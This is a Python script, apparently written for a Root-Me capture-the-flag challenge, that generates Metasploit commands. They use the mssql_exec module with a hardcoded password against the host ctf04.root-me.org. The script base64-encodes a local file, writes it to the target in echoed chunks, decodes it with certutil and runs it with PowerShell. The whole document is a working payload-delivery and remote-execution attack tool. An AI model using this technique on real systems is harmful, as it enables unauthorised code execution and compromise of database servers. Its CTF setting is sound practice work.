import sys
import base64


if len(sys.argv) < 5:
    print("Usage : ./script_metasploit_cmds [to_upload] [out] [temp_file] [final_file] (block_size)")
    exit()
elif len(sys.argv) > 5:
    block_size = int(sys.argv[5])
else:
    block_size = 300

for i in range(len(sys.argv)):
    sys.argv[i] = sys.argv[i].replace('\\','\\\\')

host = 'ctf04.root-me.org'

f = base64.b64encode(open(sys.argv[1],'rb').read())

with open(sys.argv[2], 'wb+') as g:
    g.write('use auxiliary/admin/mssql/mssql_exec\n')
    g.write('set PASSWORD ChangeMe\n')
    g.write('set RHOST '+host+'\n')
    g.write("set cmd 'del "+sys.argv[3]+" && del "+sys.argv[4]+" && echo -----BEGIN CERTIFICATE----->>"+sys.argv[3]+"'\n")
    g.write('exploit\n')
    for i in range(0, len(f), block_size):
        g.write('set cmd echo '+f[i:i+block_size]+'>>'+sys.argv[3]+'\n')
        g.write('exploit\n')
    g.write("set cmd 'echo -----END CERTIFICATE----->>"+sys.argv[3]+" && type "+sys.argv[3]+" && certutil -decode "+sys.argv[3]+" "+sys.argv[4]+"'\n")
    g.write('exploit\n')
    g.write("set cmd 'powershell -File "+sys.argv[4]+"'\n")
    g.write('exploit\n')
